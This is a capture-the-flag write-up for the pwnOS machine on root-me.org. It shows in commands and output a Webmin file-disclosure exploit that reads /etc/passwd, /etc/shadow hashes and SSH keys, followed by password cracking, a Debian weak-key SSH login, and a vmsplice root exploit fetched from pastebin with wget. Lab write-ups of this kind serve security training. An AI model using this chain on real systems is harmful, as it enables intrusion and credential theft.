@@ -1,0 +1,254 @@
+pwnOS
+time taken: 2 hours
+
+HOKAY, fire up nmap:
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-28 23:18 MDT
+Nmap scan report for ctf02.root-me.org (212.129.28.21)
+Host is up (0.086s latency).
+Not shown: 993 closed ports
+PORT      STATE    SERVICE      VERSION
+22/tcp    open     ssh          OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 e4:46:40:bf:e6:29:ac:c6:00:e2:b2:a3:e1:50:90:3c (DSA)
+|_  2048 10:cc:35:45:8e:f2:7a:a1:cc:db:a0:e8:bf:c7:73:3d (RSA)
+25/tcp    filtered smtp
+80/tcp    open     http         Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   filtered msrpc
+139/tcp   filtered netbios-ssn
+445/tcp   filtered microsoft-ds
+10000/tcp open     http         MiniServ 0.01 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Device type: general purpose|printer|switch
+Running (JUST GUESSING): QEMU (96%), Konica Minolta embedded (87%), Bay Networks embedded (87%), HP embedded (87%), GNU Hurd (87%), Minolta embedded (86%), NEC embedded (86%)
+OS CPE: cpe:/a:qemu:qemu cpe:/h:konicaminolta:7035 cpe:/h:baynetworks:baystack_450 cpe:/o:gnu:hurd
+Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (87%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (87%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (87%), HP 9100c Digital Sender printer (J3113A) (87%), GNU Hurd 0.3 (87%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.37 ms 10.0.2.2
+2   0.30 ms ctf02.root-me.org (212.129.28.21)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.47 seconds
+
+
+at http://ctf02.root-me.org/index1.php?help=true&connect=true:
+
+we are greeted with a condescending page that lets us specify if we are n00bs, sk1ll3d n00bs, or l33t hax0rs
+
+webmin is running on port 10000, we can use Metasploit's auxiliary/admin/webmin/file_disclosure to get users from /etc/password:
+
+msf > use auxiliary/admin/webmin/file_disclosure  
+msf auxiliary(file_disclosure) > show options
+
+Module options (auxiliary/admin/webmin/file_disclosure):
+
+   Name     Current Setting   Required  Description
+   ----     ---------------   --------  -----------
+   DIR      /unauthenticated  yes       Webmin directory path
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST    (target IP)       yes       The target address
+   RPATH    /etc/passwd       yes       The file to download
+   RPORT    10000             yes       The target port (TCP)
+   SSL      false             no        Negotiate SSL/TLS for outgoing connections
+   VHOST                      no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Download  
+
+
+msf auxiliary(file_disclosure) > set RHOST 212.129.28.21
+RHOST => 212.129.28.21
+msf auxiliary(file_disclosure) > exploit
+
+[*] Attempting to retrieve /etc/passwd...
+[*] The server returned: 200 Document follows
+root:x:0:0:root:/root:/bin/bash
+.
+.
+.
+obama:x:1001:1001::/home/obama:/bin/bash
+osama:x:1002:1002::/home/osama:/bin/bash
+yomama:x:1003:1003::/home/yomama:/bin/bash
+[*] Auxiliary module execution completed
+
+alternatively, we can try something crazy, 
+like http://ctf02.root-me.org/index1.php?help=true&connect=/etc/passwd, 
+to get the same right in the browser
+
+so we have users:
+
+obama
+osama
+yomama
+
+let's try our luck and see if .ssh/authorized_keys is installed in the /home/directory for any of these users,
+to get an ssh key that will let us login to ssh without a password
+
+msf auxiliary(file_disclosure) > set RPATH /home/osama/.ssh/authorized_keys/
+RPATH => /home/osama/.ssh/authorized_keys/
+msf auxiliary(file_disclosure) > exploit
+[*] Attempting to retrieve /home/osama/.ssh/authorized_keys/...
+[*] The server returned: 404 File not found
+<h1>Error - File not found</h1>
+[*] Auxiliary module execution completed
+
+nor was it in yomama,
+
+so let's hit up Barry:
+
+msf auxiliary(file_disclosure) > set RPATH /home/obama/.ssh/authorized_keys/
+RPATH => /home/obama/.ssh/authorized_keys/
+msf auxiliary(file_disclosure) > exploit
+[*] Attempting to retrieve /home/obama/.ssh/authorized_keys/...
+[*] The server returned: 200 Document follows
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
+[*] Auxiliary module execution completed
+
+we can now get Obama's ssh key after we somehow find the private key.
+
+but wait...if that worked for ssh keys, could it work for the shadow file?
+
+let's try to get /etc/shadow...
+
+msf auxiliary(file_disclosure) > set RPATH /etc/shadow
+RPATH => /etc/shadow
+msf auxiliary(file_disclosure) > exploit
+
+[*] Attempting to retrieve /etc/shadow...
+[*] The server returned: 200 Document follows
+root:$1$/664Fqzj$Tr0AJdeAFA2kvxo/1aDPg0:15444:0:99999:7:::
+.
+.
+.
+vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
+obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
+osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
+yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
+[*] Auxiliary module execution completed
+
+NO WAY. we just got all 3 user password hashes AND the ROOT PASSWORD HASH!
+
+Attempt to crack with john
+
+root@kdog:~/ctf_shit/pwn_os# john --wordlist=/media/sf_shared_VM/rockyou.txt pw_hashes.txt 
+Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
+Use the "--format=aix-smd5" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+..looks like it will take about 2 hours. 
+aintnobodygottimefodat.jpeg
+back to the keys...
+
+looking online, it looks like public keys can be matched with private keys through bruteforcing:
+
+# Autor: hitz - WarCat team (warcat.no-ip.org)
+# Collaborator: pretoriano
+#
+# 1. Download https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
+#
+# 2. Extract it to a directory
+#
+# 3. Execute the python script
+#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
+#     - execute: python exploit.py (without parameters) to display the help
+#     - if the key is found, the script shows something like that:
+#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
+#         Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
+
+download and then grep to match private key with public key:
+
+root@kdog:~/ctf_shit/pwn_os/5622/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ *.pub
+dcbe2a56e8cdea6d17495f6648329ee2-4679.pub
+
+root@kdog:~/ctf_shit/pwn_os/5622/rsa/2048# ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@ctf02.root-me.org
+Warning: the RSA host key for 'ctf02.root-me.org' differs from the key for the IP address '212.129.28.21'
+Offending key for IP in /root/.ssh/known_hosts:17
+Matching host key in /root/.ssh/known_hosts:22
+Are you sure you want to continue connecting (yes/no)? yes
+Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+Last login: Thu Jun 19 10:10:29 2008
+obama@ubuntuvm:~$ ls
+obama@ubuntuvm:~$ uname -r
+2.6.22-14-server
+
+privesc time!!
+
+we're dealing with 2.6.22, so from previous CTF's I know to use:
+https://www.exploit-db.com/exploits/5092/
+
+load that shit into pastebin, wget, add newline char, yada yada..
+
+obama@ubuntuvm:/tmp$ wget https://pastebin.com/raw/pded9GnJ --no-check-certificate
+--01:58:47--  https://pastebin.com/raw/pded9GnJ
+           => `pded9GnJ'
+Resolving pastebin.com... 104.20.208.21, 104.20.209.21
+Connecting to pastebin.com|104.20.208.21|:443... connected.
+WARNING: Certificate verification error for pastebin.com: unable to get local issuer certificate
+WARNING: certificate common name `ssl509083.cloudflaressl.com' doesn't match requested host name `pastebin.com'.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+
+    [ <=>                                                                             ] 6,580         --.--K/s             
+
+01:58:47 (43.96 MB/s) - `pded9GnJ' saved [6580]
+
+obama@ubuntuvm:/tmp$ sed -i -e '$a\' exp.c
+obama@ubuntuvm:/tmp$ gcc -o exp exp.c     
+obama@ubuntuvm:/tmp$ ./exp
+-----------------------------------
+ Linux vmsplice Local Root Exploit
+ By qaaz
+-----------------------------------
+[+] mmap: 0x0 .. 0x1000
+[+] page: 0x0
+[+] page: 0x20
+[+] mmap: 0x4000 .. 0x5000
+[+] page: 0x4000
+[+] page: 0x4020
+[+] mmap: 0x1000 .. 0x2000
+[+] page: 0x1000
+[+] mmap: 0xb7e20000 .. 0xb7e52000
+[+] root
+root@ubuntuvm:/tmp# id
+uid=0(root) gid=0(root) groups=1001(obama)
+root@ubuntuvm:/tmp# cat /passwd
+(ROOT FLAG)
+
+easy privec
+
+------------------------------------------------------------
+BONUS:
+
+if you are feeling naughty, simply set rpath to /passwd using the file_disclosure Metasploit 
+module to get the root flag without actually being root. This only works for the root-me.org 
+hosted version of this VM, as you validate being root by reading a root-only password. 
+Such a password does not exist in the normal VM.
+I discovered this early on but refused to use it as it is bad sportsmanship.
+
+msf auxiliary(file_disclosure) > set RPATH /passwd
+RPATH => /passwd
+msf auxiliary(file_disclosure) > exploit
+[*] Attempting to retrieve /passwd...
+[*] The server returned: 200 Document follows
+(ROOT FLAG)
+
